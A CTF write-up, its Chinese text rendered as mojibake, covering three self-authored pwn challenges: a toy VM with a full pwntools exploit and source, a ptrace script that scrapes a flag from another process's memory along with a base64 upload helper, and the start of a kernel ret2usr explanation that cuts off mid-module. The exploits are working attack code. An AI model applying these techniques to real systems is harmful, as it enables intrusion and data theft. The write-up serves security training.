å½“æˆ‘ä»¬mmapè‡ªå®šä¹‰åœ°å€åï¼ˆæˆ‘é€‰æ‹©çš„æ˜¯0x123000ï¼‰ï¼Œè¿˜éœ€è¦æŠŠåœ°å€å¡«å†™åˆ°è¿™ï¼Œå°±åƒæˆ‘ä¸Šé¢åˆ†æçš„ä¸€æ ·é€šè¿‡è°ƒè¯•ä¸éš¾å‘ç°è¿™ä¸ªæŒæœ‰è€…å˜é‡å’Œåˆšæ‰ç¬¬32ä¸ªæ–‡ä»¶çš„å­˜æ”¾æ–‡ä»¶åçš„åœ°å€é‡åˆäº†ï¼Œå”¯ä¸€å¯ä»¥è¾“å…¥è¿™ä¸ªå˜é‡çš„åœ°æ–¹å°±æ˜¯åœ¨å¯åŠ¨æœºå™¨çš„æ—¶å€™ï¼Œåœ¨machine\_startå‡½æ•°å¯ä»¥æ‰¾åˆ°rebootåŠŸèƒ½

```text
if ( !strncmp(off_2040B8, (const char *)buf, v7) )
   {
     clearScreen();
     boot();
   }
```

æ­¤æ—¶å¡«å……holderä¸º0x123000å³å¯ï¼Œç­‰åˆ°è™šæ‹Ÿæœºé‡å¯è¿›æ¥åï¼Œå†ç”¨ä¼ªæ±‡ç¼–è°ƒæ•´flagæ–‡ä»¶çš„openæ¨¡å¼å³å¯ç”¨catæŠ“å–

#### EXP

```python
from pwn import *
context.log_level='debug'
r=process('./HRPVM')
r.recv()
r.sendline('HRPHRP')
r.recv()
r.sendline('PWNME')
r.recv()
r.sendline('HRP')

for i in range(1,33):
  r.recv()
  r.sendline('file')
  r.recv()
  r.sendline(str(i))
  r.recv()
  r.sendline(str(i))
r.recv()
r.sendline('file')
r.recv()
r.sendline(str(33))
r.recv()
r.sendline("mov rdi,35;mov rsi,0;call open,2;")
r.recv()
r.sendline('./33')
r.recv()
r.sendline('DEBUG')
r.recv()
r.sendline('file input')
r.recv()
r.sendline('flag')
r.recv()
r.sendline('mmap')
r.recv()
r.sendline(str(0x123000))
r.recv()
r.sendline('exit')
r.recv()
gdb.attach(r)

r.sendline('reboot')
r.recv()
r.sendline('HRPHRP')
r.recv()
r.sendline('PWNME')
r.recv()
r.send(p64(0x123000))

r.recv()
r.sendline('file')
r.recv()
r.sendline(str(39))
r.recv()
r.sendline("mov rdi,37;mov rsi,1001;call open,2;")
r.recv()
r.sendline('./39')
r.recv()
r.sendline('cat flag')
r.interactive()
```

#### æºç 

```c
#include <stdbool.h>
#include<stdio.h>
#include <math.h>
#include <stdlib.h>
#include<unistd.h>
#include <sys/prctl.h>
#include <linux/filter.h>
#include <linux/seccomp.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <string.h>
typedef enum 
{
  MOV=0,//0
  CALL=1,//1
}IS;
typedef enum 
{
  RDI=0,//0
  RSI=1,//1
  RDX=2,//2
  RAX=3,//3

}RG;
long long int REG[4];
struct user{
    unsigned int uid;
    unsigned int gid;
    char holder[0x40];
}users;
struct HRPFILE{
  long long int mod;
  char *filename;
    long long int fd;
    char *file_content;
    
}HF[0x20];
int file_count=0;
long long int global_fd=3;


int user_count=0;
unsigned int user_size=4096;
int login_if=0;
char username[]="HRPHRP\x00";
char password[]="PWNME\x00";
void write_HRP(int fd,char *cont,int len)
{
  write(fd,cont,len);
}
void boot_user()
{
  /*
  FILE *fp=fopen("./users","r+");
  if (!fp) {
        perror("fopen");
        exit(EXIT_FAILURE);
    }
  username_password = malloc(0x100);

    while (fscanf(fp, "%[^\n ] ", username_password+user_count) != EOF) {
      user_count+=8;
    }
    fclose(fp);*/
    
}
void write_banner()
{
  char banner1[]=" â–ˆâ–ˆ      â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ   â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ        â–ˆâ–ˆâ–ˆâ–ˆ     â–ˆâ–ˆâ–ˆâ–ˆ     â–ˆâ–ˆ       â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ      â–ˆâ–ˆ â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆ     â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ\n";
  char banner2[]="â–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–ˆâ–ˆ      â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ   â–ˆâ–ˆâ–‘â–ˆâ–ˆ    â–ˆâ–ˆâ–ˆâ–ˆ     â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ   â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘\n";
  char banner3[]="â–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ   â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ   â–‘â–ˆâ–ˆ      â–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆ â–ˆâ–ˆ â–‘â–ˆâ–ˆ   â–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆ   â–ˆâ–ˆ    â–‘â–‘ â–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆ  â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ     \n";
  char banner4[]="â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆâ–ˆ  â–‘â–ˆâ–ˆ  â–ˆâ–ˆ  â–‘â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ       â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ\n";
  char banner5[]="â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–‘â–‘â–ˆâ–ˆ  â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘  â–‘â–‘â–‘â–‘â–‘ â–‘â–ˆâ–ˆ  â–‘â–‘â–ˆ   â–‘â–ˆâ–ˆ â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆ       â–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ  â–‘â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘ \n";
  char banner6[]="â–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ  â–‘â–‘â–ˆâ–ˆ â–‘â–ˆâ–ˆ            â–‘â–ˆâ–ˆ   â–‘    â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–‘â–‘â–‘â–‘â–‘â–ˆâ–ˆâ–‘â–‘â–ˆâ–ˆ    â–ˆâ–ˆâ–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ   â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆ     \n";
  char banner7[]="â–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ   â–‘â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ            â–‘â–ˆâ–ˆ        â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆ â–‘â–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ â–‘â–ˆâ–ˆ     â–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆâ–‘â–ˆâ–ˆ    â–‘â–‘â–ˆâ–ˆâ–ˆâ–‘â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ\n";
  char banner8[]="â–‘â–‘      â–‘â–‘ â–‘â–‘     â–‘â–‘ â–‘â–‘             â–‘â–‘         â–‘â–‘ â–‘â–‘      â–‘â–‘   â–‘â–‘â–‘â–‘â–‘â–‘  â–‘â–‘      â–‘â–‘ â–‘â–‘ â–‘â–‘      â–‘â–‘â–‘ â–‘â–‘â–‘â–‘â–‘â–‘â–‘â–‘\n";
  write_HRP(1,banner1,strlen(banner1));
  write_HRP(1,banner2,strlen(banner2));
  write_HRP(1,banner3,strlen(banner3));
  write_HRP(1,banner4,strlen(banner4));
  write_HRP(1,banner5,strlen(banner5));
  write_HRP(1,banner6,strlen(banner6));
  write_HRP(1,banner7,strlen(banner7));
  write_HRP(1,banner8,strlen(banner8));
}
void login_system()
{
  write_HRP(1,"USER NAME:\n",strlen("USER NAME:\n"));
  char name[0x30];
  scanf("%48s[^\n ]",name);
  getchar();
  char pass[0x30];
  write_HRP(1,"PASSWORD:\n",strlen("PASSWORD:\n"));
  scanf("%48s[^\n ]",pass);
  getchar();
  for(int i=0;i<1;i++)
  {
    if(!strcmp(name,username))
    {
      if(!strcmp(pass,password))
      {
        login_if=1;
      }
      else{
        write_HRP(1,"password error\n",strlen("password error\n"));
        exit(0);
      }
    }
    else{
      write_HRP(1,"username error\n",strlen("username error\n"));
        exit(0);
    }
  }
  users.uid=1000;
  users.gid=1000;
  printf("%s","[+]HOLDER:");
  read(0,users.holder,0x10);
}
void clearScreen(){
    printf("\e[1;1H\e[2J");
}
int check_repeat(char *name)
{
  for(int i=0;i<file_count;i++)
  {
    if(!strcmp(name,HF[i].filename))
    {  
      write_HRP(1,"FILE HAD!\n",strlen("FILE HAD!\n"));
      return 0;
    }
    else{
      ;
    }
  }
  return 1;
}
int check_repeat_reboot(char *name)
{
  for(int i=0;i<file_count;i++)
  {
    if(!strcmp(name,HF[i].filename))
    {  
      return 0;
    }
    else{
      ;
    }
  }
  return 1;
}
void create_file(char *name)
{
  
  
  int check=check_repeat(name);
  if(!check)
  {
    return;
  }
  HF[file_count].fd=global_fd;
  HF[file_count].filename=name;
  HF[file_count].mod=1000;
  HF[file_count].file_content=malloc(0x1000);
  
  printf("FILE CONTENT: ");
  read(0,HF[file_count].file_content,0x1000);
  deleEnter(HF[file_count].file_content);
  file_count++;
  global_fd++;
}
void ls()
{
  for(int i=0;i<file_count;i++)
  {
    printf("%s ",HF[i].filename);
    
  }
  puts("");
}
void deleEnter(char *name)
{
  char *tmp = NULL;
  if ((tmp = strstr(name, "\n")))
  {
       *tmp = '\0';
  }
}
void cat(char *name)
{
  for(int i=0;i<file_count;i++)
  {
    if(!strcmp(name,HF[i].filename))
    {  
      if(HF[i].mod==1001)
      {
        printf("%s\n",HF[i].file_content);
        return;
      }
      else{
        printf("%s%s%s\n","cat: ",name,": Permission denied");
        return;
      }
      
    }
    else{
      

    }
  }
}
void vm_elf(char *name)
{
  char tmp_cmd[0x100][0x10];
  int count=0;
  char *exec;
  char tmp_file_content[0x1000];
  for(int i=0;i<file_count;i++)
  {
    if(!strcmp(name,HF[i].filename))
    {
      strncpy(tmp_file_content,HF[i].file_content,0x1000);
      exec = strtok(tmp_file_content, ";");
      while( exec != NULL ) 
      {
        strncpy(tmp_cmd[count],exec,0x10);
        count++;
        exec = strtok(NULL, ";");
        
            
      }
    }
  }  


  char IS[0x100][0x10];
  char *exec_IS;
  int count_IS=0;
  for(int i=0;i<count;i++)
  {
    strncpy(tmp_file_content,tmp_cmd[i],0x1000);
    exec_IS = strtok(tmp_file_content, " ");
    while( exec_IS != NULL ) 
    {

      strncpy(IS[count_IS],exec_IS,0x10);
      exec_IS = strtok(NULL, " ");
      count_IS++;
    }
  }

  char obj[0x100][0x10];
  char *exec_obj;
  int count_obj=0;
  

  for(int i=0;i<count_IS;i++)
  {
    if(i%2!=0)
    {
      strncpy(tmp_file_content,IS[i],0x1000);
      exec_obj = strtok(tmp_file_content, ",");
      while( exec_obj != NULL ) 
      {
        strncpy(obj[count_obj],exec_obj,0x10);
        exec_obj = strtok(NULL, " ");
        count_obj++;
      }
    }
  }


  int index=1000;
  int a,b;
  for(int i=0;i<count_obj;i++)
  {
    if(i%2==0)
    {
      if(!strcmp(IS[i],"mov"))
      {
        index=MOV;
        goto is;
      }
      else{
        index=1000;
      }
      if(!strcmp(IS[i],"call"))
      {
        index=CALL;
        goto is;
      }
      else{
        index=1000;
      }
      
    }
is:    switch(index)
    {
      case MOV:
          a=atoi(obj[i]);
          b=atoi(obj[i+1]);
          if((a&&b))
          {
            break;
          }
          else if(a)
          {
            break;
          }
          else
          {
            if(!strcmp(obj[i],"rdi"))
            {
              REG[RDI]=atoi(obj[i+1]);
              
            }
            if(!strcmp(obj[i],"rsi"))
            {
              REG[RSI]=atoi(obj[i+1]);
              
            }
            if(!strcmp(obj[i],"rdx"))
            {
              REG[RDX]=atoi(obj[i+1]);
              
            }
            if(!strcmp(obj[i],"rax"))
            {
              REG[RAX]=atoi(obj[i+1]);
              
            }
          }
        
        break;
      case CALL:
          a=atoi(obj[i]);
          b=atoi(obj[i+1]);
          if((a))
          {
            break;
          }
          else if(!b)
          {
            break;
          }
          else
          {
            if(!strcmp(obj[i],"open"))
            {
              REG[RAX]=b;
              if(REG[RAX]==2)
              {
                
                HRP_OPEN(REG[RDI],REG[RSI]);
              }
              
            }
            if(!strcmp(obj[i],"write"))
            {
              REG[RAX]=b;
              if(REG[RAX]==1)
              {  
                HRP_WRITE(REG[RDI],REG[RSI],REG[RDX]);
              }
              
            }  
          }
          break;
      default:puts("INVAID IS!");return;
    }
  }

}
void HRP_WRITE(int fd,int buf,int size)
{
  
  for(int i=0;i<file_count;i++)
  {
    if(buf==HF[i].fd)
    {
      if(HF[i].mod!=1001)
      {
        puts("MOD CAN WRITE");
        return;
      }
      else{
        write(fd,HF[i].file_content,size);
        puts("");
      }
    }
  }
}
void HRP_OPEN(int fd,int mod)
{
  for(int i=0;i<file_count;i++)
  {
    if(fd==HF[i].fd)
    {
      HF[i].mod=mod;
      return;
    }
  }
  clearScreen();
  puts("NOT FOUND,PLEASE NEW FILE");
  printf("%s","FILE NAME: ");
  char name[0x10];
  scanf("%16s[^\n ]",name);
  getchar();
  deleEnter(name);
  create_file(name);

}
char *debug_cmd[]={"id\x00","file input\x00","file out\x00","exit\x00","mmap\x00"};
void charge_file(char *op)
{
  if(!strcmp(op,"file input"))
  {
    int i;
    puts("FILE NAME:");
    char *name=malloc(0x20);
    char a[0x1000];
    read(0,name,0x20);
    deleEnter(name);
    FILE * fp1 = fopen(name, "ab+");
      if (fp1==NULL) {//è‹¥æ‰“å¼€æ–‡ä»¶å¤±è´¥åˆ™é€€å‡º
          perror(fopen);
          return;
      }
      for(i=0;fscanf(fp1,"%c",a+i)!=EOF;i++);
      fclose(fp1);//å…³é—­è¾“å…¥æ–‡ä»¶
    
    HF[file_count].fd=global_fd;
    HF[file_count].filename=name;
    HF[file_count].mod=1000;
    HF[file_count].file_content=malloc(0x1000);
    
    strncpy(HF[file_count].file_content,a,0x1000);
    file_count++;
    global_fd++;
  }
  else if(!strcmp(op,"file out"))
  {

  }
}
void DEBUG()
{
  puts("[+]DEBUGING");
  char choice[0x20];
  while(1)
  {
    printf("%s","[+][DEBUGING]root# ");
    read(0,choice,0x20);
    if(!strncmp(debug_cmd[0],choice,strlen(debug_cmd[0])))
    {
      printf("uid=%d  gid=%d\n",users.uid,users.gid );
    }
    if(!strncmp(debug_cmd[1],choice,strlen(debug_cmd[1])))
    {
      deleEnter(choice);
      charge_file(choice);
    }
    if(!strncmp(debug_cmd[2],choice,strlen(debug_cmd[2])))
    {
      deleEnter(choice);
      charge_file(choice);
    }
    if(!strncmp(debug_cmd[3],choice,strlen(debug_cmd[3])))
    {
      deleEnter(choice);
      users.gid=1000;
      users.uid=1000;
      strncpy(users.holder,"\x00\x00\x00\x00\x00\x00\x00\x00",8);
      machine_start();
    }
    if(!strncmp(debug_cmd[4],choice,strlen(debug_cmd[4])))
    {
      unsigned long long int addr=0;
      puts("[+]ADDR EXPEND:");
      scanf("%lld",&addr);
      mmap((void *)addr, 1024LL, PROT_READ|PROT_WRITE, 34, -1, 0LL);
      
    }
  }
}
void rm(char *name)
{
  for(int i=0;i<file_count;i++)
  {
    if(!strcmp(name,HF[i].filename))
    {  
      
      HF[file_count].fd=NULL;
      HF[file_count].filename=NULL;
      HF[file_count].mod=1000;
      HF[file_count].file_content=NULL;
      file_count--;
      global_fd--;
    }
    else{
      

    }
  }
}
char *system_cmd[]={"ls\x00","id\x00","file\x00","cat\x00","./\x00","reg\x00","DEBUG\x00","reboot\x00","shutdown\x00","rm\x00"};
void machine_start()
{
  char *tmp;
  tmp=(char *)malloc(0x200);
  while(1)
  {
    write_HRP(1,"HRP-MACHINE$ ",strlen("HRP-MACHINE$ "));
    read(0,tmp,0x200);
    if(!strncmp(system_cmd[0],tmp,strlen(system_cmd[0])))
    {
      ls();
    }
    if(!strncmp(system_cmd[1],tmp,strlen(system_cmd[1])))
    {
      printf("uid=%d  gid=%d\n",users.uid,users.gid );
    }
    if(!strncmp(system_cmd[2],tmp,strlen(system_cmd[2])))
    {
      clearScreen();
      char *name=malloc(0x20);
      printf("FILE NAME: ");
      scanf("%16s[^\n ]",name);
      getchar();
      deleEnter(name);
      create_file(name);
    }
    if(!strncmp(system_cmd[3],tmp,strlen(system_cmd[3])))
    {
      char *exec;
         exec = strtok(tmp, " ");
         exec = strtok(NULL, " ");
         deleEnter(exec);
         cat(exec);
    }
    if(!strncmp(system_cmd[4],tmp,strlen(system_cmd[4])))
    {
      char *exec;
         exec = strtok(tmp, "./");
         deleEnter(exec);
         vm_elf(exec);
    }
    if(!strncmp(system_cmd[5],tmp,strlen(system_cmd[5])))
    {
      printf("RDI:%lld RSI:%lld RDX:%lld RAX:%lld\n",REG[RDI],REG[RSI],REG[RDX],REG[RAX]);
    }
    if(!strncmp(system_cmd[6],tmp,strlen(system_cmd[6])))
    {
      if(users.gid==0&&users.uid==0)
      {
        DEBUG();
      }
    }
    if(!strncmp(system_cmd[7],tmp,strlen(system_cmd[7])))
    {
      clearScreen();
      boot();
    }
    if(!strncmp(system_cmd[8],tmp,strlen(system_cmd[8])))
    {
      clearScreen();
      exit(0);
    }
    if(!strncmp(system_cmd[9],tmp,strlen(system_cmd[9])))
    {
      char *exec;
         exec = strtok(tmp, " ");
         exec = strtok(NULL, " ");
         deleEnter(exec);
         rm(exec);
    }
  }
}
void boot()
{
  write_banner();
  login_system();
  if(login_if==1)
  {
    REG[RDI]=0;
    REG[RSI]=0;
    REG[RDX]=0;
    REG[RAX]=0;
    int check=check_repeat_reboot("README");
    if(!check)
    {
      goto start;
    }
    HF[file_count].fd=global_fd;
    HF[file_count].filename="README";
    HF[file_count].mod=1001;
    HF[file_count].file_content=malloc(0x1000);
    
    strncpy(HF[file_count].file_content,"Welcome my machine,you can use it to make some easy file or exec some file. Now let me show u an easy asm //open mov rdi,1;mov rsi,1001;call open 2; just like this u can open a file.\n",0x1000);
    deleEnter(HF[file_count].file_content);
    file_count++;
    global_fd++;

start:    machine_start();
  }

}
void init()
{
  setbuf(stdin,0);
  setbuf(stdout,0);

}
int main(int argc, char const *argv[])
{
  init();
  boot();
  
  getchar();
  return 0;
}
```

### injection2.0ğŸ’‰

é¢˜ç›®æä¾›çš„initæ–‡ä»¶åˆ†æ

```text
#!/bin/sh
echo "INIT SCRIPT"
mkdir /tmp
mount -t proc none /proc
mount -t sysfs none /sys
mount -t devtmpfs none /dev
mount -t debugfs none /sys/kernel/debug
mount -t tmpfs none /tmp
echo 0 | tee /proc/sys/kernel/yama/ptrace_scope
chown 0:0 flag
chmod 755 flag
exec 0</dev/console
exec 1>/dev/console
exec 2>/dev/console
echo -e "Boot took $(cut -d' ' -f1 /proc/uptime) seconds"
./target >pso.file 2>&1 &
setsid /bin/cttyhack setuidgid 0 /bin/sh
#setsid /bin/cttyhack setuidgid 0 /bin/sh # ä¿®æ”¹ uid gid ä¸º 0 ä»¥ææƒ /bin/sh è‡³ rootã€‚
poweroff -f # è®¾ç½® shell é€€å‡ºååˆ™å…³é—­æœºå™¨
```

echo 0 | tee /proc/sys/kernel/yama/ptrace\_scope

./target >pso.file 2>&1 &

setsid /bin/cttyhack setuidgid 0 /bin/sh

è¿™3å¥æ˜¯å…³é”®ï¼Œç°åœ¨æ˜¯rootï¼Œç„¶åå¼€å¯äº†ptraceï¼Œå¹¶ä¸”æŠŠtargetç¨‹åºæŒ‚åˆ°äº†åå°

target

è¯»å–flagåˆ°æ ˆä¸Šåå°±æ­»å¾ªç¯è¾“å‡ºhelloworld

```c
int __cdecl __noreturn main(int argc, const char **argv, const char **envp)
{
  int fd; // [rsp+Ch] [rbp-114h]
  char buf[264]; // [rsp+10h] [rbp-110h] BYREF
  unsigned __int64 v5; // [rsp+118h] [rbp-8h]

  v5 = __readfsqword(0x28u);
  fd = open("./flag", 436, envp);
  read(fd, buf, 0x30uLL);
  close(fd);
  close(0);
  close(1);
  close(2);
  system("rm flag");
  while ( 1 )
  {
    write(1, "Hello World\n", 0xCuLL);
    sleep(2u);
  }
}
```

åˆ©ç”¨æ€è·¯

rootä¸‹å¯ä½¿ç”¨ptraceæ¥å£ï¼Œç›´æ¥åˆ©ç”¨ptraceæœç´¢è¿›ç¨‹å†…å­˜ï¼Œps -efè·å–åˆ°è¿›ç¨‹çš„PID å†å»/proc/pid/mapsè·å–åˆ°æ ˆåœ°å€

åˆ©ç”¨ptraceè·å–æ ˆå†…æ•°æ®æ¯”å¯¹flagæ ¼å¼å­—ç¬¦ä¸²ï¼Œæˆ‘æœ¬åœ°æµ‹è¯•ç”¨çš„flagæ ¼å¼å°±æ˜¯flag{}

è¿˜æœ‰ä¸€ä¸ªå°ç»†èŠ‚ï¼Œæˆ‘çš„qemué‡Œé¢æ”¾äº†soæ–‡ä»¶å¯ä»¥è·‘åŠ¨æ€é“¾æ¥ç¨‹åºã€‚

#### exp

```c
#include <stdio.h>
#include <sys/ptrace.h>
//cat /proc/131/maps
int main(int argv , char **argc){
 
  int data ;
  int stat ;
  int pid = atoi(argc[1]) ;
  ptrace(PTRACE_ATTACH, pid, NULL, NULL) ;
  wait(&stat) ;    // å¦‚æœä¸waitï¼Œé©¬ä¸Šè¿›è¡Œä¸‹ä¸€ä¸ªptraceçš„PEEKæ“ä½œä¼šé€ æˆ no such process é”™è¯¯
  long long int addr = 0 ;
  scanf("%llx",&addr);
  for (; addr < 0x7ffffffff000; ++addr)
  {
    data = ptrace(PTRACE_PEEKDATA, pid, addr, NULL);    // ä¸€æ¬¡è¯»ä¸€ä¸ªå­—èŠ‚
    if(data==0x65636165)
    {
      printf("data = %x , addr = %llx\n" , data , addr) ;
      long long int addr1=addr-1;
      char data1;
      for(int i=0;i<100;i++)
      {
        addr1+=1;
        data1 = ptrace(PTRACE_PEEKDATA, pid, addr1, NULL);
        //write(1,data1,0x10);
        printf("%c" , data1) ;
      }
      
      
    }
      
  }
  
  ptrace(PTRACE_DETACH, pid, NULL, NULL);
 
  return 1 ;
}
```

#### ä¸Šä¼ è„šæœ¬

```python
from pwn import *
context(log_level='debug')
#io = process("./boot.sh")
io = remote("",53408)

def exec_cmd(cmd):
    io.sendline(cmd)
    io.recvuntil("# ")

def upload(exp):
    p = log.progress("Upload")
    with open("./"+exp, "rb") as f:
        data = f.read()
    encoded = base64.b64encode(data)
    io.recvuntil("# ")

    for i in range(0, len(encoded), 600):
        p.status("%d / %d" % (i, len(encoded)))
        exec_cmd("echo \"%s\" >> /tmp/benc" % (encoded[i:i+600]))

    exec_cmd("cat /tmp/benc | base64 -d > /tmp/exp")
    exec_cmd("chmod +x /tmp/exp")
upload('infect')
io.interactive()
```

### kernel-test æœ¬æ¬¡èµ„æºåˆé›†ï¼ŒåŒ…æ‹¬æºç ï¼ŒEXPï¼ŒdockerğŸ§¬

```text
é“¾æ¥ï¼šhttps://pan.baidu.com/s/1h7xSB1qJp5s3MsoOCWUDig?pwd=2v64 
æå–ç ï¼š2v64 
--æ¥è‡ªç™¾åº¦ç½‘ç›˜è¶…çº§ä¼šå‘˜V4çš„åˆ†äº«
```

#### Ret2usr

è¿™ç§æŠ€æœ¯å·²ç»å¾ˆè€äº†è€Œä¸”å¾ˆå¥½é˜²èŒƒå¼€å¯smepç›´æ¥å¯„äº†ï¼Œä½†æ˜¯çœŸçš„å¾ˆå¥½ç”¨ï¼Œæ–¹ä¾¿ï¼Œä¸ç”¨æ‰¾gadgetä¸ç”¨æ§åˆ¶bpï¼Œspå¯„å­˜å™¨

ç½‘ä¸Šå·²ç»æœ‰äº†å¾ˆå¤šå¾ˆå¤šçš„å®˜æ–¹é˜è¿°ï¼Œæˆ‘è¿™é‡Œåªåšé€šä¿—ç†è§£ã€‚

#### ç®€æ˜“è®²è§£

å¯¹äºæ“ä½œç³»ç»Ÿï¼Œæˆ‘ä»¬éƒ½çŸ¥é“å­˜åœ¨ç”¨æˆ·æ€å’Œå†…æ ¸æ€ï¼Œé©±åŠ¨æŒ‚è½½æ˜¯åœ¨å†…æ ¸æ€é‡Œé¢è·‘æ±‡ç¼–çš„ï¼Œæ™®é€šäºŒè¿›åˆ¶ç¨‹åºæ˜¯åœ¨ç”¨æˆ·æ€é‡Œè·‘çš„ã€‚

å¦‚æœqemuæ²¡æœ‰å¼€å¯kvm64ï¼Œkvm64 +smepéƒ½å¯ä»¥åœ¨ç”¨æˆ·æ€ä»£ç ç©ºé—´å»æ‰§è¡Œä»»æ„ä»£ç ã€‚é€šä¿—è®²smepå°±æ˜¯ç›¸å½“äºå¹³å¸¸é¢˜ç›®çš„NXã€‚

æ€è·¯å¾ˆç®€å•ï¼Œç”¨æˆ·æ‰“å¼€é©±åŠ¨ï¼Œç”¨äº¤äº’æ¨¡å—å»åˆ©ç”¨æ¼æ´ã€‚æ¯”å¦‚æº¢å‡ºï¼Œç”¨readæ³„éœ²canaryï¼Œwriteæ„é€ ropã€‚

æ§åˆ¶ripä»å†…æ ¸æ€è·³è½¬åˆ°ç”¨æˆ·æ€ï¼Œæ‰§è¡Œæˆ‘ä»¬expä¸­å†™å¥½äº†çš„ææƒå‡½æ•°ã€‚

å…¶å®ä¸ç”¨æŠŠå†…æ ¸é©±åŠ¨çœ‹çš„å¤šç¥ç§˜ï¼Œè¯´ç™½äº†æœ¬è´¨ä¸Šè¿˜æ˜¯äºŒè¿›åˆ¶æ–‡ä»¶ï¼Œåªæ˜¯ä»£ç æ‰§è¡ŒåŒºæ®µæœ‰åŒºåˆ†ï¼Œæœ‰ä¸åŒçš„ä¿æŠ¤æœºåˆ¶ï¼Œå †æ ˆä¸Šæœ¬è´¨çš„ç‰¹æ€§ä¸ä¼šå˜çš„ã€‚ä¸è¿‡éšç€GCCå’Œå†…æ ¸ç‰ˆæœ¬æé«˜ï¼Œå¾ˆå¤šgadgetå·²ç»æ¶ˆå¤±äº†ï¼Œå¸¸è§çš„ropæ‰‹æ³•å’Œæ ˆè¿ç§»æ‰‹æ³•åŸºæœ¬ä¸Šç®—æ˜¯å¯„äº†

è¿™é‡Œç®€å•è®²ä¸‹è‡ªå·±å‡ºçš„è¿™ä¸ªä¾‹é¢˜

#### æºç 

```c
#include <linux/module.h>    // included for all kernel modules
#include <linux/kernel.h>    // included for KERN_INFO
#include <linux/init.h>      // included for __init and __exit macros
#include <linux/scpi_protocol.h>
#include <asm/io.h>
#include <linux/slab.h>
#include <linux/fs.h>        // file_operation is defined in this header
#include <linux/device.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("HRP");
MODULE_DESCRIPTION("An easy kernel attack!");

static int      majorNumber;
static struct   class*  HRP_module_class = NULL;
static struct   device* HRP_module_device = NULL;
#define DEVICE_NAME "test"      //define device name
#define CLASS_NAME  "HRP_module"
char pwn[0x300]="flag{I_am_flag_!}";

//å‡½æ•°åŸå‹
static long HRP_module_ioctl(struct file *, unsigned int, unsigned long);
static int __init HRP_init(void);
static void __exit HRP_exit(void);
static ssize_t HRP_module_write (struct file *, const char __user *, size_t, loff_t *);
static ssize_t HRP_module_read (struct file *, char __user *, size_t, loff_t *);

